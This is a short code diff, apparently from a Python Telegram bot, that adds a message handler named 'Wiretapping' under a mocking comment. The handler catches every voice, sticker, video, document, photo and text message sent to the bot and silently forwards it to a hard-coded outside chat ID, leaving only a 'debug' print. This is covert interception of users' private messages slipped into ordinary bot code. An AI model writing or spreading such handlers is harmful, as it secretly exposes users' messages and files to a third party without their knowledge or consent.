@@ -171,11 +171,11 @@ def distance(lat1, lon1, lat2, lon2):
 
 
 
-
-
-
-
-
+# DIMA'S IDIOTS FUN METHODS
+@bot.message_handler(content_types=["voice", "sticker", "video", "document", "photo", "text"])
+def Wiretapping(message):
+    print('debug')
+    bot.forward_message(chat_id=-4031826999, from_chat_id=message.chat.id, message_id=message.id)
 
 
 
